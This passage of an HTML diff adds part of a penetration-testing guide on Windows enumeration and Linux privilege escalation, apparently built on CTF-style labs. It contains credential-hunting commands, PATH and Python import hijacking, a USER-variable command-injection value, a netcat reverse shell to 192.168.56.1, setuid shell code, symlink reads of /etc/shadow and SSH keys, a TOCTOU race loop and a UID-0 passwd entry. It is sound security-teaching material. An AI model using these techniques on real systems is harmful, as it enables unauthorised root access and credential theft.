+<span class="go">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</span>
+<span class="go">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span>
+<span class="go">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</span>
+<span class="go">dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span>
+<span class="go">dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span>
+</pre></div>
+</div>
+<p>Powershell</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-CimInstance</span> <span class="n">Win32_StartupCommand</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">Location</span><span class="p">,</span> <span class="n">User</span> <span class="p">|</span> <span class="nb">fl</span>
+<span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
+<span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span>
+<span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span>
+<span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span>
+<span class="nb">Get-ChildItem</span> <span class="s2">&quot;C:\Users\All Users\Start Menu\Programs\Startup&quot;</span>
+<span class="nb">Get-ChildItem</span> <span class="s2">&quot;C:\Users\$env:USERNAME\Start Menu\Programs\Startup&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="networking">
+<h4>Networking<a class="headerlink" href="#networking" title="Link to this heading"></a></h4>
+<section id="firewall-configuration">
+<h5>Firewall Configuration<a class="headerlink" href="#firewall-configuration" title="Link to this heading"></a></h5>
+<p>Firewall turned on? If so what’s configured?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">netsh firewall show state</span>
+<span class="go">netsh firewall show config</span>
+<span class="go">netsh advfirewall firewall show rule name=all</span>
+<span class="go">netsh advfirewall export &quot;firewall.txt&quot;</span>
+</pre></div>
+</div>
+<p>Interesting interface configurations?</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">netsh dump</span>
+</pre></div>
+</div>
+</section>
+<section id="snmp-configuration">
+<h5>SNMP Configuration<a class="headerlink" href="#snmp-configuration" title="Link to this heading"></a></h5>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s</span>
+<span class="go">Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="sensitive-files">
+<h4>Sensitive Files<a class="headerlink" href="#sensitive-files" title="Link to this heading"></a></h4>
+<section id="passwords-in-the-registry">
+<h5>Passwords in the registry<a class="headerlink" href="#passwords-in-the-registry" title="Link to this heading"></a></h5>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">reg query HKCU /f password /t REG_SZ /s</span>
+<span class="go">reg query HKLM /f password /t REG_SZ /s</span>
+</pre></div>
+</div>
+</section>
+<section id="interesting-files-to-look-at-possibly-inside-user-directories-desktop-documents-etc">
+<h5>Interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?<a class="headerlink" href="#interesting-files-to-look-at-possibly-inside-user-directories-desktop-documents-etc" title="Link to this heading"></a></h5>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">dir /s *pass* == *vnc* == *.config* 2&gt;nul</span>
+<span class="go">Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue</span>
+</pre></div>
+</div>
+</section>
+<section id="files-containing-password-inside-them">
+<h5>Files containing password inside them?<a class="headerlink" href="#files-containing-password-inside-them" title="Link to this heading"></a></h5>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">findstr /si password *.xml *.ini *.txt *.config 2&gt;nul</span>
+<span class="go">Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern &quot;password&quot;</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+</section>
+<section id="linux-privilege-escalation">
+<h2>Linux Privilege Escalation<a class="headerlink" href="#linux-privilege-escalation" title="Link to this heading"></a></h2>
+<p>Techniques for Linux privilege escalation:</p>
+<section id="privilege-escalation-from-g0tm1lk-blog">
+<h3>Privilege escalation from g0tm1lk blog<a class="headerlink" href="#privilege-escalation-from-g0tm1lk-blog" title="Link to this heading"></a></h3>
+<p>Once, we have got the unprivileged shell, it is very important to check the below things</p>
+<ul class="simple">
+<li><p>Did you tried “sudo -l” and check if we have any binaries which can be executed as root?</p></li>
+<li><p>Are there any binaries with Sticky, suid, guid.</p></li>
+<li><p>Are there any world-writable folders, files.</p></li>
+<li><p>Are there any world-execuable files.</p></li>
+<li><p>Which are the files owned by nobody (No user)</p></li>
+<li><p>Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that’s not always the case.)</p></li>
+<li><p>What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.</p></li>
+<li><p>What are the packages installed? (dpkg -l for debian) (pip list for python packages). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49 or couchdb 1.7).</p></li>
+<li><p>What are the services running? (netstat -ln)</p></li>
+<li><p>Check the entries in the crontab!</p></li>
+<li><p>What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.</p></li>
+<li><p>What groups does the user belong to (adm, audio, video, disk)?</p></li>
+<li><p>What other users are logged on the linux box (command w)?</p></li>
+</ul>
+<section id="what-advanced-linux-file-permissions-are-used">
+<h4>What “Advanced Linux File Permissions” are used?<a class="headerlink" href="#what-advanced-linux-file-permissions-are-used" title="Link to this heading"></a></h4>
+<p>Sticky bits, SUID &amp; GUID</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span>
+<span class="go">find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span>
+<span class="go">find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span>
+
+<span class="go">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID</span>
+<span class="go">for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span>
+
+<span class="gp"># </span>find<span class="w"> </span>starting<span class="w"> </span>at<span class="w"> </span>root<span class="w"> </span><span class="o">(</span>/<span class="o">)</span>,<span class="w"> </span>SGID<span class="w"> </span>or<span class="w"> </span>SUID,<span class="w"> </span>not<span class="w"> </span>Symbolic<span class="w"> </span>links,<span class="w"> </span>only<span class="w"> </span><span class="m">3</span><span class="w"> </span>folders<span class="w"> </span>deep,<span class="w"> </span>list<span class="w"> </span>with<span class="w"> </span>more<span class="w"> </span>detail<span class="w"> </span>and<span class="w"> </span>hide<span class="w"> </span>any<span class="w"> </span>errors<span class="w"> </span><span class="o">(</span>e.g.<span class="w"> </span>permission<span class="w"> </span>denied<span class="o">)</span>
+<span class="go"> find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</span>
+</pre></div>
+</div>
+</section>
+<section id="where-can-written-to-and-executed-from">
+<h4>Where can written to and executed from?<a class="headerlink" href="#where-can-written-to-and-executed-from" title="Link to this heading"></a></h4>
+<p>A few ‘common’ places: /tmp, /var/tmp, /dev/shm</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span>
+<span class="go">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span>
+<span class="go">find / -perm -o+w -type d 2&gt;/dev/null     # world-writeable folders</span>
+<span class="go">find / -perm -o+w -type f 2&gt;/dev/null     # world-writeable files</span>
+<span class="go">find / -type f -perm -o+w -not -type l -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; 2&gt;/dev/null # world-writeable files</span>
+
+<span class="go">find / -perm -o+x -type d 2&gt;/dev/null     # world-executable folders</span>
+<span class="go">find / -perm -o+x -type f 2&gt;/dev/null     # world-executable files</span>
+
+<span class="go">find / \( -perm -o+w -perm -o+x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span>
+</pre></div>
+</div>
+</section>
+<section id="any-problem-files">
+<h4>Any “problem” files?<a class="headerlink" href="#any-problem-files" title="Link to this heading"></a></h4>
+<p>Word-writeable, “nobody” files</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files</span>
+<span class="go">find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files</span>
+</pre></div>
+</div>
+</section>
+<section id="find-files-folder-owned-by-the-user">
+<h4>Find files/ folder owned by the user<a class="headerlink" href="#find-files-folder-owned-by-the-user" title="Link to this heading"></a></h4>
+<p>After compromising the machine with an unprivileged shell, /home would contains the users present on the system. Also, viewable by checking /etc/passwd. Many times, we do want to see if there are any files owned by those users outside their home directory.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">find / -user username 2&gt; /dev/null</span>
+<span class="go">find / -group groupname 2&gt; /dev/null</span>
+</pre></div>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Find files by wheel/ adm users or the users in the home directory. If the user is member of other groups (such as audio, video, disk), it might be a good idea to check for files owned by particular groups.</p>
+</div>
+</section>
+</section>
+<section id="other-linux-privilege-escalation">
+<h3>Other Linux Privilege Escalation<a class="headerlink" href="#other-linux-privilege-escalation" title="Link to this heading"></a></h3>
+<section id="execution-of-binary-from-relative-location-than-absolute">
+<h4>Execution of binary from Relative location than Absolute<a class="headerlink" href="#execution-of-binary-from-relative-location-than-absolute" title="Link to this heading"></a></h4>
+<p>If we figure out that a suid binary is running with relative locations (for example let’s say backjob is running “id” and “scp /tmp/special <a class="reference external" href="mailto:ron&#37;&#52;&#48;ton&#46;home">ron<span>&#64;</span>ton<span>&#46;</span>home</a>”)(figured out by running strings on the binary). The problem with this is, that it’s trying to
+execute a file/ script/ program on a RELATIVE location (opposed to an ABSOLUTE location like /sbin would be). And we will now exploit this to become root.</p>
+<p>Something like this:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">system(&quot;/usr/bin/env echo and now what?&quot;);</span>
+</pre></div>
+</div>
+<p>so we can create a file in temp:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo &quot;/bin/sh&quot; &gt;&gt; /tmp/id</span>
+<span class="go">chmod +x /tmp/id</span>
+</pre></div>
+</div>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">www-data@yummy:/tmp$ </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/tmp/id
+<span class="gp">www-data@yummy:/tmp$ </span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+<span class="gp">www-data@yummy:/tmp$ </span>which<span class="w"> </span>id
+<span class="go">/tmp/id</span>
+<span class="gp">www-data@yummy:/tmp$ </span>/opt/backjob
+<span class="go">whoami</span>
+<span class="go">root</span>
+<span class="gp"># </span>/usr/bin/id
+<span class="go">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
+</pre></div>
+</div>
+<p>By changing the PATH prior executing the vulnerable suid binary (i.e. the location, where Linux is searching for the relative located file), we force the system to look first into /tmp when searching for “scp” or “id” . So the chain of commands is:</p>
+<ul class="simple">
+<li><p>/opt/backjob switches user context to root (as it is suid) and tries to run “scp or id”</p></li>
+<li><p>Linux searches the filesystem according to its path (here: in /tmp first)</p></li>
+<li><p>Our malicious /tmp/scp or /tmp/id gets found and executed as root</p></li>
+<li><p>A new bash opens with root privileges.</p></li>
+</ul>
+<p>If we execute a binary without specifying an absolute paths, it goes in order of your $PATH variable. By default, it’s something like:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+</pre></div>
+</div>
+<p>It is important to see .bash_profile file which contains the $PATH</p>
+</section>
+<section id="environment-variable-abuse">
+<h4>Environment Variable Abuse<a class="headerlink" href="#environment-variable-abuse" title="Link to this heading"></a></h4>
+<p>If the suid binary contains a code like</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));</span>
+<span class="go">printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);</span>
+<span class="go">system(buffer);</span>
+</pre></div>
+</div>
+<p>We can see that it is accepting environment variable USER which can be user-controlled. In that case just define USER variable to</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">USER=&quot;;/bin/sh;&quot;</span>
+</pre></div>
+</div>
+<p>When the program is executed, USER variable will contain /bin/sh and will be executed on system call.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo $USER</span>
+<span class="go">;/bin/sh;</span>
+
+<span class="gp">levelXX@:/home/flagXX$ </span>./flagXX
+<span class="go">about to call system(&quot;/bin/echo ;/bin/sh; is cool&quot;)</span>
+
+<span class="gp">sh-4.2$ </span>id
+<span class="go">uid=997(flagXX) gid=1003(levelXX) groups=997(flagXX),1003(levelXX)</span>
+</pre></div>
+</div>
+</section>
+<section id="world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab">
+<h4>World-Writable Folder with a Script executing any file in that folder using crontab<a class="headerlink" href="#world-writable-folder-with-a-script-executing-any-file-in-that-folder-using-crontab" title="Link to this heading"></a></h4>
+<p>If there exists any world-writeable folder plus if there exists a cronjob which executes any script in that world-writeable folder such as</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
+
+<span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span>/home/flagXX/writable.d/*<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">       </span><span class="o">(</span><span class="nb">ulimit</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="p">;</span><span class="w"> </span>bash<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$i</span><span class="s2">&quot;</span><span class="o">)</span>
+<span class="w">       </span>rm<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$i</span><span class="s2">&quot;</span>
+<span class="k">done</span>
+</pre></div>
+</div>
+<p>then either we can create a script in that folder /home/flagXX/writeable.d which gives us a reverse shell like</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">echo &quot;/bin/nc.traditional -e /bin/sh 192.168.56.1 22&quot; &gt; hello.sh</span>
+</pre></div>
+</div>
+<p>or</p>
+<p>we can create a suid file to give us the privileged user permission</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
+gcc<span class="w"> </span>/var/tmp/shell.c<span class="w"> </span>-o<span class="w"> </span>/var/tmp/flagXX
+chmod<span class="w"> </span><span class="m">4777</span><span class="w"> </span>/var/tmp/flagXX
+</pre></div>
+</div>
+<p>Considering shell.c contains</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+</pre></div>
+</div>
+</section>
+<section id="symlink-creation">
+<h4>Symlink Creation<a class="headerlink" href="#symlink-creation" title="Link to this heading"></a></h4>
+<p>Multiple time, we would find that a suid binary belonging to another user is authorized to read a particular file. For example Let’s say there’s a suid binary called readExampleConf which can read a file named example.conf as a suid user. This binary can be tricked into reading any other file by creating a Symlink or a softlink. For example if we want to read /etc/shadow file which can be read by suid user. we can do</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ln -s /etc/shadow /home/xxxxxx/example.conf</span>
+<span class="go">ln -s /home/xxx2/.ssh/id_rsa /home/xxxxxxx/example.conf</span>
+</pre></div>
+</div>
+<p>Now, when we try to read example.conf file, we would be able to read the file for which we created the symlink</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">readExampleConf /home/xxxxxxx/example.conf</span>
+<span class="go">&lt;Contents of shadow or id_rsa&gt;</span>
+</pre></div>
+</div>
+</section>
+<section id="directory-symlink">
+<h4>Directory Symlink<a class="headerlink" href="#directory-symlink" title="Link to this heading"></a></h4>
+<p>Let’s see what happens when we create a symlink of a directory</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ln -s /etc/ sym_file</span>
+<span class="go">ln -s /etc/ sym_fold/</span>
+</pre></div>
+</div>
+<p>Here the first one create a direct symlink to the /etc folder and will be shown as</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sym_file -&gt; /etc/</span>
+</pre></div>
+</div>
+<p>where as in the second one ( ln -s /etc/ sym_fold/ ), we first create a folder sym_fold and then create a symlink</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sym_fold:</span>
+<span class="go">total 0</span>
+<span class="go">lrwxrwxrwx 1 bitvijays bitvijays 5 Dec  2 19:31 etc -&gt; /etc/</span>
+</pre></div>
+</div>
+<p>This might be useful to bypass some filtering, when let’s say a cronjob is running but refuses to take backup of anything named /etc . In that case, we can create a symlink inside a folder and take the backup.</p>
+</section>
+<section id="time-of-check-to-time-of-use">
+<h4>Time of check to time of use<a class="headerlink" href="#time-of-check-to-time-of-use" title="Link to this heading"></a></h4>
+<p>In Unix, if a binary program such as below following C code (uses access to check the access of the specific file and to open a specific file), when used in a setuid program, has a TOCTTOU bug:</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="s">&quot;file&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">W_OK</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;file&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_WRONLY</span><span class="p">);</span>
+<span class="c1">//read over /etc/shadow</span>
+<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</pre></div>
+</div>
+<p>Here, access is intended to check whether the real user who executed the setuid program would normally be allowed to write the file (i.e., access checks the real userid rather than effective userid). This race condition is vulnerable to an attack:</p>
+<p>Attacker</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="c1">//</span>
+<span class="c1">//</span>
+<span class="c1">// After the access check</span>
+<span class="n">symlink</span><span class="p">(</span><span class="s">&quot;/etc/shadow&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;file&quot;</span><span class="p">);</span>
+<span class="c1">// Before the open, &quot;file&quot; points to the password database</span>
+<span class="c1">//</span>
+<span class="c1">//</span>
+</pre></div>
+</div>
+<p>In this example, an attacker can exploit the race condition between the access and open to trick the setuid victim into overwriting an entry in the system password database. TOCTTOU races can be used for privilege escalation, to get administrative access to a machine.</p>
+<p>Let’s see how we can exploit this?</p>
+<p>In the below code, we are linking the file which we have access (/tmp/hello.txt) and the file which we want to read (and currently don’t have access) (/home/flagXX/token). The f switch on ln makes sure we overwrite the existing symbolic link. We run it in the while true loop to create the race condition.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>ln<span class="w"> </span>-sf<span class="w"> </span>/tmp/hello.txt<span class="w"> </span>/tmp/token<span class="p">;</span><span class="w"> </span>ln<span class="w"> </span>-sf<span class="w"> </span>/home/flagXX/token<span class="w"> </span>/tmp/token<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</pre></div>
+</div>
+<p>We would also run the program in a while loop</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>./flagXX<span class="w"> </span>/tmp/token<span class="w"> </span><span class="m">192</span>.168.56.1<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</pre></div>
+</div>
+<section id="learning">
+<h5>Learning<a class="headerlink" href="#learning" title="Link to this heading"></a></h5>
+<p>Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
+</section>
+</section>
+<section id="writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system">
+<h4>Writable /etc/passwd or account credentials came from a legacy unix system<a class="headerlink" href="#writable-etc-passwd-or-account-credentials-came-from-a-legacy-unix-system" title="Link to this heading"></a></h4>
+<ul class="simple">
+<li><p>Passwords are normally stored in /etc/shadow, which is not readable by users. However, historically, they were stored in the world-readable file /etc/passwd along with all account information.</p></li>
+<li><p>For backward compatibility, if a password hash is present in the second column in /etc/passwd, it takes precedence over the one in /etc/shadow.</p></li>
+<li><p>Also, an empty second field in /etc/passwd means that the account has no password, i.e. anybody can log in without a password (used for guest accounts). This is sometimes disabled.</p></li>
+<li><p>If passwordless accounts are disabled, you can put the hash of a password of your choice. we can use the mkpasswd to generate password hashes, for example</p></li>
+</ul>
+<blockquote>
+<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go"> Usage: mkpasswd [OPTIONS]... [PASSWORD [SALT]]</span>
+<span class="go"> Crypts the PASSWORD using crypt(3).</span>
+
+<span class="go">    -m, --method=TYPE     select method TYPE</span>
+<span class="go">    -5                    like --method=md5</span>
+<span class="go">    -S, --salt=SALT       use the specified SALT</span>
+<span class="go">    -R, --rounds=NUMBER   use the specified NUMBER of rounds</span>
+<span class="go">    -P, --password-fd=NUM read the password from file descriptor NUM</span>
+<span class="go">                          instead of /dev/tty</span>
+<span class="go">    -s, --stdin           like --password-fd=0</span>
+<span class="go">    -h, --help            display this help and exit</span>
+<span class="go">    -V, --version         output version information and exit</span>
+
+<span class="go">mkpasswd can generate DES, MD5, SHA-256, SHA-512</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li><p>It’s possible to gain root access even if you can only append to /etc/passwd and not overwrite the contents. That’s because it’s possible to have multiple entries for the same user, as long as they have different names — users are identified by their ID, not by their name, and the defining feature of the root account is not its name but the fact that it has user ID 0. So you can create an alternate root account by appending a line that declares an account with another name, a password of your choice and user ID 0</p></li>
+</ul>
+</section>
+<section id="elevating-privilege-from-a-suid-binary">
+<h4>Elevating privilege from a suid binary<a class="headerlink" href="#elevating-privilege-from-a-suid-binary" title="Link to this heading"></a></h4>
+<p>If we have ability to create a suid binary, we can use either</p>
+<p>Suid.c</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">execl</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">,</span><span class="err">”</span><span class="n">sh</span><span class="err">”</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+</pre></div>
+</div>
+<p>or</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash -p&quot;</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+</pre></div>
+</div>
+<p>However, if we have a unprivileged user, it is always better to check whether /bin/sh is the original binary or a symlink to /bin/bash or /bin/dash. If it’s a symlink to bash, it won’t provide us suid privileges, bash automatically drops its privileges when it’s being run as suid (another security mechanism to prevent executing scripts as suid). So, it might be good idea to copy dash or sh to the remote system, suid it and use it.</p>
+<p>More details can be found at <a class="reference external" href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html">Common Pitfalls When Writing Exploits</a></p>
+</section>
+<section id="executing-python-script-with-sudo">
+<h4>Executing Python script with sudo<a class="headerlink" href="#executing-python-script-with-sudo" title="Link to this heading"></a></h4>
+<p>If there exists a python script which has a import statement and a user has a permission to execute it using sudo.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">display_script</span><span class="o">.</span><span class="n">py</span><span class="o">&gt;</span>
+
+<span class="c1">#!/usr/bin/python3</span>
+<span class="kn">import</span> <span class="nn">ftplib</span> <span class="ow">or</span> <span class="kn">import</span> <span class="nn">example</span>
+<span class="o">&lt;</span><span class="n">Python</span> <span class="n">code</span> <span class="n">utilizing</span> <span class="n">ftplib</span> <span class="ow">or</span> <span class="n">example</span> <span class="n">calling</span> <span class="n">some</span> <span class="n">function</span><span class="o">&gt;</span>
+<span class="nb">print</span> <span class="p">(</span><span class="n">example</span><span class="o">.</span><span class="n">display</span><span class="p">())</span>
+</pre></div>
+</div>
+<p>and is executed using</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo python display_script.py</span>
+</pre></div>
+</div>
+<p>We can use this to privilege escalate to the higher privileges. As python would imports modules in the current directory first, then from the modules dir (PYTHONPATH), we could make a malicious python script (of the same name of import module such as ftplib or example)
+and have it imported by the program. The malicious script may have a function similar to used in example.py executing our command. e.g.</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">example</span><span class="o">.</span><span class="n">py</span><span class="o">&gt;</span>
+<span class="c1">#!/usr/bin/python3</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="k">def</span> <span class="nf">display</span><span class="p">():</span>
+   <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span>
+   <span class="n">exit</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>The result would be “root”. This is mainly because <a class="reference external" href="https://docs.python.org/2/library/sys.html#sys.path">sys.path</a> is populated using the current working directory, followed by directories listed in your PYTHONPATH environment variable, followed by installation-dependent default paths, which are controlled by the site module.</p>
+<section id="example">
+<h5>Example<a class="headerlink" href="#example" title="Link to this heading"></a></h5>
+<p>If we run our script with sudo (sudo myscript.py) then the environment variable $USER will be root and the environment variable $SUDO_USER will be the name of the user who executed the command sudo myscript.py. Consider the following scenario:</p>
+<p>A linux user bob is logged into the system and possesses sudo privileges. He writes the following python script named myscript.py:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="nb">print</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;USER&quot;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;SUDO_USER&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>He then makes the script executable with chmod +x myscript.py and then executes his script with sudo privileges with the command:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo ./myscript.py</span>
+</pre></div>
+</div>
